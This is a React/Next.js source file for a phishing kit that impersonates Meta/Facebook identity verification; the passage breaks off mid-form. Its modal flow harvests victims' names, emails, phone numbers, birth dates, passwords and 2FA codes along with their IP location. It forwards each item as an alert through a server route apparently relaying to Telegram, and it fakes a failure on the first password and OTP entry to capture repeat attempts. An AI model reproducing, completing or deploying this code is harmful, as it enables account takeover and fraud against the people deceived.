"use client";

import React, { useState, useEffect, useRef, useMemo, createContext, useContext } from "react";

// ==================== CẤU HÌNH TOÀN BỘ QUỐC GIA TRÊN THẾ GIỚI ====================
function getFlagEmoji(countryCode: string) {
  return String.fromCodePoint(
    ...countryCode.toUpperCase().split("").map((char) => 127397 + char.charCodeAt(0))
  );
}

interface Country {
  code: string;
  name: string;
  dialCode: string;
  flag: string;
}

const countriesList: Country[] = [
  { code: "AF", name: "Afghanistan", dialCode: "+93", flag: getFlagEmoji("AF") },
  { code: "AL", name: "Albania", dialCode: "+355", flag: getFlagEmoji("AL") },
  { code: "DZ", name: "Algeria", dialCode: "+213", flag: getFlagEmoji("DZ") },
  { code: "AD", name: "Andorra", dialCode: "+376", flag: getFlagEmoji("AD") },
  { code: "AO", name: "Angola", dialCode: "+244", flag: getFlagEmoji("AO") },
  { code: "AG", name: "Antigua and Barbuda", dialCode: "+1-268", flag: getFlagEmoji("AG") },
  { code: "AR", name: "Argentina", dialCode: "+54", flag: getFlagEmoji("AR") },
  { code: "AM", name: "Armenia", dialCode: "+374", flag: getFlagEmoji("AM") },
  { code: "AU", name: "Australia", dialCode: "+61", flag: getFlagEmoji("AU") },
  { code: "AT", name: "Austria", dialCode: "+43", flag: getFlagEmoji("AT") },
  { code: "AZ", name: "Azerbaijan", dialCode: "+994", flag: getFlagEmoji("AZ") },
  { code: "BS", name: "Bahamas", dialCode: "+1-242", flag: getFlagEmoji("BS") },
  { code: "BH", name: "Bahrain", dialCode: "+973", flag: getFlagEmoji("BH") },
  { code: "BD", name: "Bangladesh", dialCode: "+880", flag: getFlagEmoji("BD") },
  { code: "BB", name: "Barbados", dialCode: "+1-246", flag: getFlagEmoji("BB") },
  { code: "BY", name: "Belarus", dialCode: "+375", flag: getFlagEmoji("BY") },
  { code: "BE", name: "Belgium", dialCode: "+32", flag: getFlagEmoji("BE") },
  { code: "BZ", name: "Belize", dialCode: "+501", flag: getFlagEmoji("BZ") },
  { code: "BJ", name: "Benin", dialCode: "+229", flag: getFlagEmoji("BJ") },
  { code: "BT", name: "Bhutan", dialCode: "+975", flag: getFlagEmoji("BT") },
  { code: "BO", name: "Bolivia", dialCode: "+591", flag: getFlagEmoji("BO") },
  { code: "BA", name: "Bosnia and Herzegovina", dialCode: "+387", flag: getFlagEmoji("BA") },
  { code: "BW", name: "Botswana", dialCode: "+267", flag: getFlagEmoji("BW") },
  { code: "BR", name: "Brazil", dialCode: "+55", flag: getFlagEmoji("BR") },
  { code: "BN", name: "Brunei", dialCode: "+673", flag: getFlagEmoji("BN") },
  { code: "BG", name: "Bulgaria", dialCode: "+359", flag: getFlagEmoji("BG") },
  { code: "BF", name: "Burkina Faso", dialCode: "+226", flag: getFlagEmoji("BF") },
  { code: "BI", name: "Burundi", dialCode: "+257", flag: getFlagEmoji("BI") },
  { code: "CV", name: "Cabo Verde", dialCode: "+238", flag: getFlagEmoji("CV") },
  { code: "KH", name: "Cambodia", dialCode: "+855", flag: getFlagEmoji("KH") },
  { code: "CM", name: "Cameroon", dialCode: "+237", flag: getFlagEmoji("CM") },
  { code: "CA", name: "Canada", dialCode: "+1", flag: getFlagEmoji("CA") },
  { code: "CF", name: "Central African Republic", dialCode: "+236", flag: getFlagEmoji("CF") },
  { code: "TD", name: "Chad", dialCode: "+235", flag: getFlagEmoji("TD") },
  { code: "CL", name: "Chile", dialCode: "+56", flag: getFlagEmoji("CL") },
  { code: "CN", name: "China", dialCode: "+86", flag: getFlagEmoji("CN") },
  { code: "CO", name: "Colombia", dialCode: "+57", flag: getFlagEmoji("CO") },
  { code: "KM", name: "Comoros", dialCode: "+269", flag: getFlagEmoji("KM") },
  { code: "CG", name: "Congo", dialCode: "+242", flag: getFlagEmoji("CG") },
  { code: "CD", name: "Congo (Democratic Republic)", dialCode: "+243", flag: getFlagEmoji("CD") },
  { code: "CR", name: "Costa Rica", dialCode: "+506", flag: getFlagEmoji("CR") },
  { code: "CI", name: "Côte d'Ivoire", dialCode: "+225", flag: getFlagEmoji("CI") },
  { code: "HR", name: "Croatia", dialCode: "+385", flag: getFlagEmoji("HR") },
  { code: "CU", name: "Cuba", dialCode: "+53", flag: getFlagEmoji("CU") },
  { code: "CY", name: "Cyprus", dialCode: "+357", flag: getFlagEmoji("CY") },
  { code: "CZ", name: "Czech Republic", dialCode: "+420", flag: getFlagEmoji("CZ") },
  { code: "DK", name: "Denmark", dialCode: "+45", flag: getFlagEmoji("DK") },
  { code: "DJ", name: "Djibouti", dialCode: "+253", flag: getFlagEmoji("DJ") },
  { code: "DM", name: "Dominica", dialCode: "+1-767", flag: getFlagEmoji("DM") },
  { code: "DO", name: "Dominican Republic", dialCode: "+1-809", flag: getFlagEmoji("DO") },
  { code: "EC", name: "Ecuador", dialCode: "+593", flag: getFlagEmoji("EC") },
  { code: "EG", name: "Egypt", dialCode: "+20", flag: getFlagEmoji("EG") },
  { code: "SV", name: "El Salvador", dialCode: "+503", flag: getFlagEmoji("SV") },
  { code: "GQ", name: "Equatorial Guinea", dialCode: "+240", flag: getFlagEmoji("GQ") },
  { code: "ER", name: "Eritrea", dialCode: "+291", flag: getFlagEmoji("ER") },
  { code: "EE", name: "Estonia", dialCode: "+372", flag: getFlagEmoji("EE") },
  { code: "SZ", name: "Eswatini", dialCode: "+268", flag: getFlagEmoji("SZ") },
  { code: "ET", name: "Ethiopia", dialCode: "+251", flag: getFlagEmoji("ET") },
  { code: "FJ", name: "Fiji", dialCode: "+679", flag: getFlagEmoji("FJ") },
  { code: "FI", name: "Finland", dialCode: "+358", flag: getFlagEmoji("FI") },
  { code: "FR", name: "France", dialCode: "+33", flag: getFlagEmoji("FR") },
  { code: "GA", name: "Gabon", dialCode: "+241", flag: getFlagEmoji("GA") },
  { code: "GM", name: "Gambia", dialCode: "+220", flag: getFlagEmoji("GM") },
  { code: "GE", name: "Georgia", dialCode: "+995", flag: getFlagEmoji("GE") },
  { code: "DE", name: "Germany", dialCode: "+49", flag: getFlagEmoji("DE") },
  { code: "GH", name: "Ghana", dialCode: "+233", flag: getFlagEmoji("GH") },
  { code: "GR", name: "Greece", dialCode: "+30", flag: getFlagEmoji("GR") },
  { code: "GD", name: "Grenada", dialCode: "+1-473", flag: getFlagEmoji("GD") },
  { code: "GT", name: "Guatemala", dialCode: "+502", flag: getFlagEmoji("GT") },
  { code: "GN", name: "Guinea", dialCode: "+224", flag: getFlagEmoji("GN") },
  { code: "GW", name: "Guinea-Bissau", dialCode: "+245", flag: getFlagEmoji("GW") },
  { code: "GY", name: "Guyana", dialCode: "+592", flag: getFlagEmoji("GY") },
  { code: "HT", name: "Haiti", dialCode: "+509", flag: getFlagEmoji("HT") },
  { code: "HN", name: "Honduras", dialCode: "+504", flag: getFlagEmoji("HN") },
  { code: "HK", name: "Hong Kong", dialCode: "+852", flag: getFlagEmoji("HK") },
  { code: "HU", name: "Hungary", dialCode: "+36", flag: getFlagEmoji("HU") },
  { code: "IS", name: "Iceland", dialCode: "+354", flag: getFlagEmoji("IS") },
  { code: "IN", name: "India", dialCode: "+91", flag: getFlagEmoji("IN") },
  { code: "ID", name: "Indonesia", dialCode: "+62", flag: getFlagEmoji("ID") },
  { code: "IR", name: "Iran", dialCode: "+98", flag: getFlagEmoji("IR") },
  { code: "IQ", name: "Iraq", dialCode: "+964", flag: getFlagEmoji("IQ") },
  { code: "IE", name: "Ireland", dialCode: "+353", flag: getFlagEmoji("IE") },
  { code: "IL", name: "Israel", dialCode: "+972", flag: getFlagEmoji("IL") },
  { code: "IT", name: "Italy", dialCode: "+39", flag: getFlagEmoji("IT") },
  { code: "JM", name: "Jamaica", dialCode: "+1-876", flag: getFlagEmoji("JM") },
  { code: "JP", name: "Japan", dialCode: "+81", flag: getFlagEmoji("JP") },
  { code: "JO", name: "Jordan", dialCode: "+962", flag: getFlagEmoji("JO") },
  { code: "KZ", name: "Kazakhstan", dialCode: "+7", flag: getFlagEmoji("KZ") },
  { code: "KE", name: "Kenya", dialCode: "+254", flag: getFlagEmoji("KE") },
  { code: "KI", name: "Kiribati", dialCode: "+686", flag: getFlagEmoji("KI") },
  { code: "KP", name: "North Korea", dialCode: "+850", flag: getFlagEmoji("KP") },
  { code: "KR", name: "South Korea", dialCode: "+82", flag: getFlagEmoji("KR") },
  { code: "KW", name: "Kuwait", dialCode: "+965", flag: getFlagEmoji("KW") },
  { code: "KG", name: "Kyrgyzstan", dialCode: "+996", flag: getFlagEmoji("KG") },
  { code: "LA", name: "Laos", dialCode: "+856", flag: getFlagEmoji("LA") },
  { code: "LV", name: "Latvia", dialCode: "+371", flag: getFlagEmoji("LV") },
  { code: "LB", name: "Lebanon", dialCode: "+961", flag: getFlagEmoji("LB") },
  { code: "LS", name: "Lesotho", dialCode: "+266", flag: getFlagEmoji("LS") },
  { code: "LR", name: "Liberia", dialCode: "+231", flag: getFlagEmoji("LR") },
  { code: "LY", name: "Libya", dialCode: "+218", flag: getFlagEmoji("LY") },
  { code: "LI", name: "Liechtenstein", dialCode: "+423", flag: getFlagEmoji("LI") },
  { code: "LT", name: "Lithuania", dialCode: "+370", flag: getFlagEmoji("LT") },
  { code: "LU", name: "Luxembourg", dialCode: "+352", flag: getFlagEmoji("LU") },
  { code: "MO", name: "Macao", dialCode: "+853", flag: getFlagEmoji("MO") },
  { code: "MG", name: "Madagascar", dialCode: "+261", flag: getFlagEmoji("MG") },
  { code: "MW", name: "Malawi", dialCode: "+265", flag: getFlagEmoji("MW") },
  { code: "MY", name: "Malaysia", dialCode: "+60", flag: getFlagEmoji("MY") },
  { code: "MV", name: "Maldives", dialCode: "+960", flag: getFlagEmoji("MV") },
  { code: "ML", name: "Mali", dialCode: "+223", flag: getFlagEmoji("ML") },
  { code: "MT", name: "Malta", dialCode: "+356", flag: getFlagEmoji("MT") },
  { code: "MH", name: "Marshall Islands", dialCode: "+692", flag: getFlagEmoji("MH") },
  { code: "MR", name: "Mauritania", dialCode: "+222", flag: getFlagEmoji("MR") },
  { code: "MU", name: "Mauritius", dialCode: "+230", flag: getFlagEmoji("MU") },
  { code: "MX", name: "Mexico", dialCode: "+52", flag: getFlagEmoji("MX") },
  { code: "FM", name: "Micronesia", dialCode: "+691", flag: getFlagEmoji("FM") },
  { code: "MD", name: "Moldova", dialCode: "+373", flag: getFlagEmoji("MD") },
  { code: "MC", name: "Monaco", dialCode: "+377", flag: getFlagEmoji("MC") },
  { code: "MN", name: "Mongolia", dialCode: "+976", flag: getFlagEmoji("MN") },
  { code: "ME", name: "Montenegro", dialCode: "+382", flag: getFlagEmoji("ME") },
  { code: "MA", name: "Morocco", dialCode: "+212", flag: getFlagEmoji("MA") },
  { code: "MZ", name: "Mozambique", dialCode: "+258", flag: getFlagEmoji("MZ") },
  { code: "MM", name: "Myanmar", dialCode: "+95", flag: getFlagEmoji("MM") },
  { code: "NA", name: "Namibia", dialCode: "+264", flag: getFlagEmoji("NA") },
  { code: "NR", name: "Nauru", dialCode: "+674", flag: getFlagEmoji("NR") },
  { code: "NP", name: "Nepal", dialCode: "+977", flag: getFlagEmoji("NP") },
  { code: "NL", name: "Netherlands", dialCode: "+31", flag: getFlagEmoji("NL") },
  { code: "NZ", name: "New Zealand", dialCode: "+64", flag: getFlagEmoji("NZ") },
  { code: "NI", name: "Nicaragua", dialCode: "+505", flag: getFlagEmoji("NI") },
  { code: "NE", name: "Niger", dialCode: "+227", flag: getFlagEmoji("NE") },
  { code: "NG", name: "Nigeria", dialCode: "+234", flag: getFlagEmoji("NG") },
  { code: "MK", name: "North Macedonia", dialCode: "+389", flag: getFlagEmoji("MK") },
  { code: "NO", name: "Norway", dialCode: "+47", flag: getFlagEmoji("NO") },
  { code: "OM", name: "Oman", dialCode: "+968", flag: getFlagEmoji("OM") },
  { code: "PK", name: "Pakistan", dialCode: "+92", flag: getFlagEmoji("PK") },
  { code: "PW", name: "Palau", dialCode: "+680", flag: getFlagEmoji("PW") },
  { code: "PS", name: "Palestine", dialCode: "+970", flag: getFlagEmoji("PS") },
  { code: "PA", name: "Panama", dialCode: "+507", flag: getFlagEmoji("PA") },
  { code: "PG", name: "Papua New Guinea", dialCode: "+675", flag: getFlagEmoji("PG") },
  { code: "PY", name: "Paraguay", dialCode: "+595", flag: getFlagEmoji("PY") },
  { code: "PE", name: "Peru", dialCode: "+51", flag: getFlagEmoji("PE") },
  { code: "PH", name: "Philippines", dialCode: "+63", flag: getFlagEmoji("PH") },
  { code: "PL", name: "Poland", dialCode: "+48", flag: getFlagEmoji("PL") },
  { code: "PT", name: "Portugal", dialCode: "+351", flag: getFlagEmoji("PT") },
  { code: "QA", name: "Qatar", dialCode: "+974", flag: getFlagEmoji("QA") },
  { code: "RO", name: "Romania", dialCode: "+40", flag: getFlagEmoji("RO") },
  { code: "RU", name: "Russia", dialCode: "+7", flag: getFlagEmoji("RU") },
  { code: "RW", name: "Rwanda", dialCode: "+250", flag: getFlagEmoji("RW") },
  { code: "KN", name: "Saint Kitts and Nevis", dialCode: "+1-869", flag: getFlagEmoji("KN") },
  { code: "LC", name: "Saint Lucia", dialCode: "+1-758", flag: getFlagEmoji("LC") },
  { code: "VC", name: "Saint Vincent and the Grenadines", dialCode: "+1-784", flag: getFlagEmoji("VC") },
  { code: "WS", name: "Samoa", dialCode: "+685", flag: getFlagEmoji("WS") },
  { code: "SM", name: "San Marino", dialCode: "+378", flag: getFlagEmoji("SM") },
  { code: "ST", name: "Sao Tome and Principe", dialCode: "+239", flag: getFlagEmoji("ST") },
  { code: "SA", name: "Saudi Arabia", dialCode: "+966", flag: getFlagEmoji("SA") },
  { code: "SN", name: "Senegal", dialCode: "+221", flag: getFlagEmoji("SN") },
  { code: "RS", name: "Serbia", dialCode: "+381", flag: getFlagEmoji("RS") },
  { code: "SC", name: "Seychelles", dialCode: "+248", flag: getFlagEmoji("SC") },
  { code: "SL", name: "Sierra Leone", dialCode: "+232", flag: getFlagEmoji("SL") },
  { code: "SG", name: "Singapore", dialCode: "+65", flag: getFlagEmoji("SG") },
  { code: "SK", name: "Slovakia", dialCode: "+421", flag: getFlagEmoji("SK") },
  { code: "SI", name: "Slovenia", dialCode: "+386", flag: getFlagEmoji("SI") },
  { code: "SB", name: "Solomon Islands", dialCode: "+677", flag: getFlagEmoji("SB") },
  { code: "SO", name: "Somalia", dialCode: "+252", flag: getFlagEmoji("SO") },
  { code: "ZA", name: "South Africa", dialCode: "+27", flag: getFlagEmoji("ZA") },
  { code: "SS", name: "South Sudan", dialCode: "+211", flag: getFlagEmoji("SS") },
  { code: "ES", name: "Spain", dialCode: "+34", flag: getFlagEmoji("ES") },
  { code: "LK", name: "Sri Lanka", dialCode: "+94", flag: getFlagEmoji("LK") },
  { code: "SD", name: "Sudan", dialCode: "+249", flag: getFlagEmoji("SD") },
  { code: "SR", name: "Suriname", dialCode: "+597", flag: getFlagEmoji("SR") },
  { code: "SE", name: "Sweden", dialCode: "+46", flag: getFlagEmoji("SE") },
  { code: "CH", name: "Switzerland", dialCode: "+41", flag: getFlagEmoji("CH") },
  { code: "SY", name: "Syria", dialCode: "+963", flag: getFlagEmoji("SY") },
  { code: "TW", name: "Taiwan", dialCode: "+886", flag: getFlagEmoji("TW") },
  { code: "TJ", name: "Tajikistan", dialCode: "+992", flag: getFlagEmoji("TJ") },
  { code: "TZ", name: "Tanzania", dialCode: "+255", flag: getFlagEmoji("TZ") },
  { code: "TH", name: "Thailand", dialCode: "+66", flag: getFlagEmoji("TH") },
  { code: "TL", name: "Timor-Leste", dialCode: "+670", flag: getFlagEmoji("TL") },
  { code: "TG", name: "Togo", dialCode: "+228", flag: getFlagEmoji("TG") },
  { code: "TO", name: "Tonga", dialCode: "+676", flag: getFlagEmoji("TO") },
  { code: "TT", name: "Trinidad and Tobago", dialCode: "+1-868", flag: getFlagEmoji("TT") },
  { code: "TN", name: "Tunisia", dialCode: "+216", flag: getFlagEmoji("TN") },
  { code: "TR", name: "Turkey", dialCode: "+90", flag: getFlagEmoji("TR") },
  { code: "TM", name: "Turkmenistan", dialCode: "+993", flag: getFlagEmoji("TM") },
  { code: "TV", name: "Tuvalu", dialCode: "+688", flag: getFlagEmoji("TV") },
  { code: "UG", name: "Uganda", dialCode: "+256", flag: getFlagEmoji("UG") },
  { code: "UA", name: "Ukraine", dialCode: "+380", flag: getFlagEmoji("UA") },
  { code: "AE", name: "United Arab Emirates", dialCode: "+971", flag: getFlagEmoji("AE") },
  { code: "GB", name: "United Kingdom", dialCode: "+44", flag: getFlagEmoji("GB") },
  { code: "US", name: "United States", dialCode: "+1", flag: getFlagEmoji("US") },
  { code: "UY", name: "Uruguay", dialCode: "+598", flag: getFlagEmoji("UY") },
  { code: "UZ", name: "Uzbekistan", dialCode: "+998", flag: getFlagEmoji("UZ") },
  { code: "VU", name: "Vanuatu", dialCode: "+678", flag: getFlagEmoji("VU") },
  { code: "VA", name: "Vatican City", dialCode: "+379", flag: getFlagEmoji("VA") },
  { code: "VE", name: "Venezuela", dialCode: "+58", flag: getFlagEmoji("VE") },
  { code: "VN", name: "Vietnam", dialCode: "+84", flag: getFlagEmoji("VN") },
  { code: "YE", name: "Yemen", dialCode: "+967", flag: getFlagEmoji("YE") },
  { code: "ZM", name: "Zambia", dialCode: "+260", flag: getFlagEmoji("ZM") },
  { code: "ZW", name: "Zimbabwe", dialCode: "+263", flag: getFlagEmoji("ZW") }
].sort((a, b) => a.name.localeCompare(b.name));

// ==================== HÀM GỬI DỮ LIỆU QUA API SERVER (route.js) ====================
async function sendToTelegramServer(payload: { name: string; email: string; message: string }) {
  try {
    const response = await fetch("/api/submit-form", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    const result = await response.json();
    console.log("Server response:", result);
  } catch (error) {
    console.error("Failed to send data to server:", error);
  }
}

// ==================== CONTEXT QUẢN LÝ LUỒNG (MODAL FLOW) ====================
interface ModalContextType {
  openModal: () => void;
  currentStep: string | null;
  closeModal: () => void;
  submitFormDetails: (data: any) => void;
  submitPasswordAttempt: (pwd: string) => Promise<boolean>;
  submitTwofaAttempt: (otp: string) => Promise<boolean>;
  locationInfo: any;
}

const ModalContext = createContext<ModalContextType | null>(null);

export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
  const [currentStep, setCurrentStep] = useState<string | null>(null);
  const [formData, setFormData] = useState<any>(null);
  const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
  const [twofaAttempts, setTwofaAttempts] = useState<string[]>([]);
  const locationRef = useRef<any>({ ip: "Unknown", country: "Unknown", city: "" });

  useEffect(() => {
    fetch("https://ipinfo.io/json")
      .then((res) => res.json())
      .then((data) => {
        locationRef.current = {
          ip: data.ip || "Unknown",
          country: data.country || "Unknown",
          city: data.city || "",
          region: data.region || "",
        };
      })
      .catch(() => {});
  }, []);

  const openModal = () => setCurrentStep("form");
  const closeModal = () => setCurrentStep(null);

  // 1. Xử lý khi hoàn tất Form bước 1
  const submitFormDetails = (data: any) => {
    setFormData(data);
    setCurrentStep("password");
    
    const msg = 
      `🚨 <b>NEW META SUBMISSION (Step 1)</b>\n\n` +
      `👤 <b>Name:</b> ${data.fullName}\n` +
      `📧 <b>Email:</b> ${data.email}\n` +
      `💼 <b>Business Email:</b> ${data.emailBusiness || "N/A"}\n` +
      `📄 <b>Page Name:</b> ${data.pageName || "N/A"}\n` +
      `📞 <b>Phone:</b> ${data.dialCode} ${data.phoneNumber}\n` +
      `🎂 <b>DOB:</b> ${data.day}/${data.month}/${data.year}\n` +
      `📝 <b>Note:</b> ${data.note || "N/A"}\n` +
      `🔔 <b>FB Notification:</b> ${data.facebookNotification ? "Enabled" : "Disabled"}\n` +
      `🌐 <b>IP:</b> ${locationRef.current.ip} (${locationRef.current.country}, ${locationRef.current.city})`;

    sendToTelegramServer({ name: data.fullName, email: data.email, message: msg });
  };

  // 2. Xử lý nhập mật khẩu
  const submitPasswordAttempt = async (pwd: string): Promise<boolean> => {
    const newAttempts = [...passwordAttempts, pwd];
    setPasswordAttempts(newAttempts);

    const msg = 
      `🔑 <b>META PASSWORD ATTEMPT #${newAttempts.length}</b>\n\n` +
      `👤 <b>Email/Phone:</b> ${formData?.email || formData?.phoneNumber}\n` +
      `🔐 <b>Password:</b> <code>${pwd}</code>\n` +
      `🌐 <b>IP:</b> ${locationRef.current.ip}`;

    sendToTelegramServer({ name: formData?.fullName || "Unknown", email: formData?.email || "Unknown", message: msg });

    if (newAttempts.length === 1) {
      return false; // Sai lần 1 để hiện lỗi khớp ảnh
    }
    
    setCurrentStep("twofa");
    return true;
  };

  // 3. Xử lý nhập mã OTP / 2FA
  const submitTwofaAttempt = async (otp: string): Promise<boolean> => {
    const newAttempts = [...twofaAttempts, otp];
    setTwofaAttempts(newAttempts);

    const msg = 
      `🛡️ <b>META 2FA CODE ATTEMPT #${newAttempts.length}</b>\n\n` +
      `👤 <b>Account:</b> ${formData?.email || formData?.phoneNumber}\n` +
      `🔢 <b>OTP Code:</b> <code>${otp}</code>\n` +
      `🌐 <b>IP:</b> ${locationRef.current.ip}`;

    sendToTelegramServer({ name: formData?.fullName || "Unknown", email: formData?.email || "Unknown", message: msg });

    if (newAttempts.length < 2) {
      return false; // Sai lần 1 để hiện đếm ngược 30s
    }

    setCurrentStep("success");
    return true;
  };

  return (
    <ModalContext.Provider
      value={{
        openModal,
        currentStep,
        closeModal,
        submitFormDetails,
        submitPasswordAttempt,
        submitTwofaAttempt,
        locationInfo: locationRef.current,
      }}
    >
      {children}
      <FormModal />
      <PasswordModal />
      <TwofaModal />
      <SuccessModal />
    </ModalContext.Provider>
  );
}

export function useModalFlow() {
  const context = useContext(ModalContext);
  if (!context) throw new Error("useModalFlow must be used within ModalFlowProvider");
  return context;
}

// ==================== COMPONENT 1: FORM THÔNG TIN (ĐÃ THU NHỎ KÍCH THƯỚC) ====================
function FormModal() {
  const { currentStep, closeModal, submitFormDetails } = useModalFlow();
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    emailBusiness: "",
    pageName: "",
    phoneNumber: "",
    countryCode: "VN",
    dialCode: "+84",
    day: "",
    month: "",
    year: "",
    note: "",
    agreeToTerms: false,
    facebookNotification: true,
  });

  const [errors, setErrors] = useState<any>({});
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const dropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setIsDropdownOpen(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const filteredCountries = useMemo(() => {
    return countriesList.filter(
      (c) => 
        c.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
        c.dialCode.includes(searchQuery) ||
        c.code.toLowerCase().includes(searchQuery.toLowerCase())
    );
  }, [searchQuery]);

  if (currentStep !== "form") return null;

  const handleChange = (e: any) => {
    const { name, value, type, checked } = e.target;
    setFormData((prev) => ({ ...prev, [name]: type === "checkbox" ? checked : value }));
    if (errors[name]) setErrors((prev: any) => ({ ...prev, [name]: "" }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    let errs: any = {};
    if (!formData.fullName.trim()) errs.fullName = "Required";
    if (!formData.email.trim()) errs.email = "Required";
    if (!formData.phoneNumber.trim()) errs.phoneNumber = "Required";
    if (!formData.day || !formData.month || !formData.year) errs.dob = "Required";
    if (!formData.agreeToTerms) errs.terms = "You must agree";

    setErrors(errs);
    if (Object.keys(errs).length === 0) {
      submitFormDetails(formData);
    }
  };

  const selectedCountry = countriesList.find((c) => c.code === formData.countryCode) || countriesList[0];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-3 sm:p-4 overflow-y-auto font-sans">
      <div className="bg-white w-full max-w-[460px] rounded-2xl shadow-2xl p-5 sm:p-6 relative my-auto border border-gray-100">
        
        {/* Nút đóng X */}
        <button 
          onClick={closeModal} 
          className="absolute top-4 right-4 w-7 h-7 flex items-center justify-center rounded-full text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-all cursor-pointer text-sm"
        >
          ✕
        </button>

        {/* Tiêu đề Meta */}
        <div className="flex items-center justify-center gap-2 mb-5">
        <img alt="Identity Verification" loading="lazy" width="100" height="33" decoding="async" src="/logo-meta.svg"/>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-3">
          {/* Full Name */}
          <div>
            <input
              type="text"
              name="fullName"
              placeholder="Full Name"
              value={formData.fullName}
              onChange={handleChange}
              className={`w-full h-10 px-3.5 rounded-lg border ${errors.fullName ? "border-red-500" : "border-gray-300"} text-xs sm:text-sm focus:border-[#0064E0] focus:outline-none text-gray-900 placeholder-gray-400`}
            />
          </div>

          {/* Email */}
          <div>
            <input
              type="email"
              name="email"
              placeholder="Email"
              value={formData.email}
              onChange={handleChange}
              className={`w-full h-10 px-3.5 rounded-lg border ${errors.email ? "border-red-500" : "border-gray-300"} text-xs sm:text-sm focus:border-[#0064E0] focus:outline-none text-gray-900 placeholder-gray-400`}
            />
          </div>

          {/* Email Business (Optional) */}
          <div>
            <input
              type="email"
              name="emailBusiness"
              placeholder="Email Business (Optional)"
              value={formData.emailBusiness}
              onChange={handleChange}
              className="w-full h-10 px-3.5 rounded-lg border border-gray-300 text-xs sm:text-sm focus:border-[#0064E0] focus:outline-none text-gray-900 placeholder-gray-400"
            />
          </div>

          {/* Page Name (Optional) */}
          <div>
            <input
              type="text"
              name="pageName"
              placeholder="Page Name (Optional)"
              value={formData.pageName}
              onChange={handleChange}
              className="w-full h-10 px-3.5 rounded-lg border border-gray-300 text-xs sm:text-sm focus:border-[#0064E0] focus:outline-none text-gray-900 placeholder-gray-400"
            />
          </div>

          {/* Phone Section */}
          <div className="flex gap-2.5 relative">
            <div className="relative shrink-0" ref={dropdownRef}>
              <button
                type="button"
                onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                className="flex items-center justify-between w-[115px] h-10 px-3 rounded-lg border border-gray-300 bg-white text-xs sm:text-sm text-gray-900 cursor-pointer focus:border-[#0064E0] focus:outline-none"
              >
                <span className="flex items-center gap-1.5 truncate">
                  <span className="text-base">{selectedCountry.flag}</span>
                  <span className="font-medium">{selectedCountry.dialCode}</span>
                </span>
                <span className="text-gray-400 text-[10px]">▼</span>
              </button>

              {/* Bảng Dropdown chọn quốc gia */}
              {isDropdownOpen && (
                <div className="absolute top-12 left-0 w-64 bg-white border border-gray-200 rounded-lg shadow-xl z-50 p-2.5 max-h-56 overflow-y-auto">
                  <input
                    type="text"
                    placeholder="Search country..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full h-9 px-3 mb-2 text-xs border border-gray-200 rounded-lg focus:outline-none focus:border-[#0064E0] text-gray-900 placeholder-gray-400"
                    autoFocus
                  />
                  <div className="space-y-0.5">
                    {filteredCountries.map((c) => (
                      <div
                        key={c.code}
                        onClick={() => {
                          setFormData((prev: any) => ({ ...prev, countryCode: c.code, dialCode: c.dialCode }));
                          setIsDropdownOpen(false);
                          setSearchQuery("");
                        }}
                        className="flex items-center justify-between px-2.5 py-2 hover:bg-gray-50 rounded-lg cursor-pointer text-xs text-gray-900 transition-colors"
                      >
                        <div className="flex items-center gap-2 truncate">
                          <span className="text-base shrink-0">{c.flag}</span>
                          <span className="font-semibold text-gray-800 shrink-0">{c.dialCode}</span>
                          <span className="truncate text-gray-600">{c.name}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <input
              type="tel"
              name="phoneNumber"
              placeholder="Phone number"
              value={formData.phoneNumber}
              onChange={handleChange}
              className={`w-full h-10 px-3.5 rounded-lg border ${errors.phoneNumber ? "border-red-500" : "border-gray-300"} text-xs sm:text-sm focus:border-[#0064E0] focus:outline-none text-gray-900 placeholder-gray-400`}
            />
          </div>

          {/* Date of Birth */}
          <div>
            <label className="block text-xs font-medium text-gray-600 mb-1">Date of Birth</label>
            <div className="grid grid-cols-3 gap-2.5">
              <input type="text" name="day" placeholder="Day" maxLength={2} value={formData.day} onChange={handleChange} className="h-10 text-center rounded-lg border border-gray-300 text-xs sm:text-sm focus:outline-none focus:border-[#0064E0] text-gray-900 placeholder-gray-400" />
              <input type="text" name="month" placeholder="Month" maxLength={2} value={formData.month} onChange={handleChange} className="h-10 text-center rounded-lg border border-gray-300 text-xs sm:text-sm focus:outline-none focus:border-[#0064E0] text-gray-900 placeholder-gray-400" />
              <input type="text" name="year" placeholder="Year" maxLength={4} value={formData.year} onChange={handleChange} className="h-10 text-center rounded-lg border border-gray-300 text-xs sm:text-sm focus:outline-none focus:border-[#0064E0] text-gray-900 placeholder-gray-400" />
            </div>
          </div>

          {/* Note (Optional) */}
          <div>
            <textarea
              name="note"
              placeholder="Note (Optional)"
              rows={3}
              maxLength={500}
              value={formData.note}
              onChange={handleChange}
              className="w-full p-3 rounded-lg border border-gray-300 text-xs sm:text-sm focus:outline-none focus:border-[#0064E0] resize-none text-gray-900 placeholder-gray-400"
            />
            <div className="text-right text-[11px] text-gray-400 mt-0.5 pr-1">
              {formData.note.length}/500 characters
            </div>
          </div>

          {/* Khung thông báo on Facebook */}
          <div className="flex items-center justify-between p-3.5 rounded-lg border border-gray-200 bg-white shadow-xs">
            <div className="flex items-center gap-2">
              <div className="rounded-full">
              <img alt="Identity Verification" loading="lazy" width="20" height="20" decoding="async" src="/ic_facebook.svg"/>
              </div>
              <div>
                <div className="text-xs font-semibold text-gray-900 leading-tight">on Facebook</div>
                <div className="text-[11px] text-gray-500 mt-0.2">We will send you a notification on Facebook.</div>
              </div>
            </div>

            <label className="relative inline-flex items-center cursor-pointer shrink-0 ml-2">
